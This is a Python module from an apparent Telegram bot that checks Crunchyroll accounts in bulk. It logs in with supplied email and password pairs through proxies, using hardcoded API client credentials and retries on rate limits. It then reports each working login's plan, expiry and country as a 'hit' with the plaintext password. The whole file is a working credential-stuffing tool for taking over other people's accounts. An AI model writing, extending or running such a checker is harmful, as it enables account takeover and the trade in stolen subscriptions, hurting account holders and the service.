"""
bot/modules/crunchyroll.py
~~~~~~~~~~~~~~~~~~~~~~~~~~
Crunchyroll account checker using ``requests`` – exact logic from ``CR.py``.

Each check runs in its own ``requests.Session`` (isolated cookies/state)
and is dispatched via ``asyncio.to_thread()`` so the event loop stays free.
"""

from __future__ import annotations

import asyncio
import uuid
from datetime import datetime
from typing import Optional

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from bot.utils.logger import setup_logger

log = setup_logger("mod.crunchyroll")

# ── API constants (from CR.py) ──────────────────────────────────────────
_CLIENT_ID = "o7uowy7q4lgltbavyhjq"
_CLIENT_SECRET = "lqrjETNx6W7uRnpcDm8wRVj8BChjC1er"

# Retry on transient HTTP errors so valid accounts aren't lost.
_RETRY = Retry(
    total=2,
    backoff_factor=0.5,
    status_forcelist=[429, 500, 502, 503, 504],
    allowed_methods=["GET", "POST"],
    raise_on_status=False,
)

_COUNTRY_MAP = {
    "AF": "Afghanistan 🇦🇫", "AX": "Åland Islands 🇦🇽",
    "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
    "AS": "American Samoa 🇦🇸", "AD": "Andorra 🇦🇩",
    "AO": "Angola 🇦🇴", "AR": "Argentina 🇦🇷",
    "AU": "Australia 🇦🇺", "AT": "Austria 🇦🇹",
    "BR": "Brazil 🇧🇷", "CA": "Canada 🇨🇦",
    "FR": "France 🇫🇷", "DE": "Germany 🇩🇪",
    "IN": "India 🇮🇳", "IT": "Italy 🇮🇹",
    "JP": "Japan 🇯🇵", "MX": "Mexico 🇲🇽",
    "ES": "Spain 🇪🇸", "GB": "United Kingdom 🇬🇧",
    "US": "United States 🇺🇸",
}


def _make_session() -> requests.Session:
    """Create a Session with automatic retries on transient errors."""
    session = requests.Session()
    adapter = HTTPAdapter(max_retries=_RETRY)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session


# ── Synchronous check (mirrors CR.py exactly) ──────────────────────────

def _check_sync(
    email: str,
    password: str,
    proxy: Optional[dict[str, str]] = None,
) -> Optional[dict]:
    """Check a single Crunchyroll account using ``requests.Session``.

    Returns a dict with hit details, a dict with ``free=True`` for free
    accounts, or ``None`` for bad credentials / errors.
    """
    session = _make_session()
    headers = {
        "User-Agent": "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    try:
        # 1. AUTHENTICATION
        data = {
            "grant_type": "password",
            "username": email,
            "password": password,
            "scope": "offline_access",
            "client_id": _CLIENT_ID,
            "client_secret": _CLIENT_SECRET,
            "device_type": "SamsungTV",
            "device_id": str(uuid.uuid4()),
            "device_name": "Goku",
        }
        r1 = session.post(
            "https://beta-api.crunchyroll.com/auth/v1/token",
            data=data, headers=headers, proxies=proxy, timeout=15,
        )

        if r1.status_code != 200:
            return None

        try:
            auth = r1.json()
        except (ValueError, KeyError):
            return None
        token = auth.get("access_token")
        pid = auth.get("profile_id")
        if not token:
            return None
        headers["Authorization"] = f"Bearer {token}"

        # 2. ACCOUNT DETAILS
        r2_resp = session.get(
            "https://beta-api.crunchyroll.com/accounts/v1/me",
            headers=headers, proxies=proxy, timeout=10,
        )
        if r2_resp.status_code != 200:
            # Authenticated but can't get account details — treat as free.
            return {"email": email, "password": password, "free": True}
        try:
            r2 = r2_resp.json()
        except ValueError:
            return {"email": email, "password": password, "free": True}

        ev = r2.get("email_verified", False)
        guid = r2.get("external_id")

        # 3. PLAN & COUNTRY
        if not guid:
            return {"email": email, "password": password, "free": True}

        r3_resp = session.get(
            f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{guid}/benefits",
            headers=headers, proxies=proxy, timeout=10,
        )
        if r3_resp.status_code != 200:
            return {"email": email, "password": password, "free": True}
        try:
            r3 = r3_resp.json()
        except ValueError:
            return {"email": email, "password": password, "free": True}

        if r3.get("total", 0) > 0:
            country_code = r3.get("subscription_country", "Unknown")
            country_full = _COUNTRY_MAP.get(country_code, country_code)

            raw_benefit = str(r3.get("items", []))
            if "streams.4" in raw_benefit:
                plan = "MEGA FAN MEMBER"
            elif "streams.6" in raw_benefit:
                plan = "ULTIMATE FAN MEMBER"
            elif "streams.1" in raw_benefit:
                plan = "FAN MEMBER"
            else:
                plan = "Premium"

            # 4. EXPIRY
            expiry = "N/A"
            remaining = "0"
            if pid:
                try:
                    r4_resp = session.get(
                        f"https://beta-api.crunchyroll.com/subs/v4/accounts/{pid}/subscriptions",
                        headers=headers, proxies=proxy, timeout=10,
                    )
                    if r4_resp.status_code == 200:
                        r4 = r4_resp.json()
                        if "nextRenewalDate" in str(r4):
                            for s in r4.get("subscriptions", []):
                                if s.get("nextRenewalDate"):
                                    expiry = s["nextRenewalDate"].split("T")[0]
                                    try:
                                        d1 = datetime.strptime(
                                            expiry, "%Y-%m-%d"
                                        )
                                        remaining = str(
                                            (d1 - datetime.now()).days
                                        )
                                    except ValueError:
                                        pass
                                    break
                except Exception:
                    pass

            return {
                "email": email,
                "password": password,
                "email_verified": ev,
                "plan": plan,
                "expiry": expiry,
                "remaining_days": remaining,
                "country": country_full,
            }
        else:
            # Valid login but no subscription → free account.
            return {"email": email, "password": password, "free": True}

    except Exception as exc:
        log.debug("CR check failed for %s: %s", email, exc)
        return None


# ── Async wrapper ───────────────────────────────────────────────────────

async def check_account(
    email: str,
    password: str,
    proxy: Optional[dict[str, str]] = None,
) -> Optional[dict]:
    """Async wrapper — runs the synchronous check in a thread."""
    return await asyncio.to_thread(_check_sync, email, password, proxy)


# ── Formatting helpers ──────────────────────────────────────────────────

def format_hit(hit: dict) -> str:
    """Format a hit dictionary into a user-friendly Telegram string."""
    return (
        f"🍥 **Crunchyroll Hit**\n"
        f"┣ **Email:** `{hit['email']}`\n"
        f"┣ **Password:** `{hit['password']}`\n"
        f"┣ **Verified:** {hit['email_verified']}\n"
        f"┣ **Plan:** {hit['plan']}\n"
        f"┣ **Expiry:** {hit['expiry']}\n"
        f"┣ **Remaining:** {hit['remaining_days']} days\n"
        f"┗ **Country:** {hit['country']}"
    )


def format_hit_line(hit: dict) -> str:
    """One-line format for results file."""
    return (
        f"{hit['email']}:{hit['password']} | "
        f"Plan={hit['plan']} | Expiry={hit['expiry']} | "
        f"Days={hit['remaining_days']} | Country={hit['country']}"
    )
